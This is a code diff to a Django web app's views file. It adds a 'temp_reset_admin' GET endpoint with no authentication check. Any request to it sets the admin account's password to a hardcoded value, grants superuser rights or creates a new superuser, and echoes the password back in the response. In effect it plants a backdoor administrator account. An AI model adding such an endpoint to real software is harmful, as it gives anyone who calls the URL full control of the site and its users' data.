@@ -174,3 +174,21 @@ def api_login(request):
             return response.Response({"success": False, "error": "Invalid credentials"}, status=400)
     except Exception as e:
         return response.Response({"success": False, "error": str(e)}, status=400)
+
+
+@api_view(['GET'])
+def temp_reset_admin(request):
+    from django.contrib.auth import get_user_model
+    User = get_user_model()
+    username = 'admin'
+    password = 'adminpassword123'
+    try:
+        u = User.objects.get(username=username)
+        u.set_password(password)
+        u.is_staff = True
+        u.is_superuser = True
+        u.save()
+        return Response({"status": "success", "message": f"Updated existing user '{username}' to password '{password}' with staff/superuser privileges."})
+    except User.DoesNotExist:
+        User.objects.create_superuser(username, 'admin@drulhasorthopedic.com', password)
+        return Response({"status": "success", "message": f"Created new superuser '{username}' with password '{password}'."})
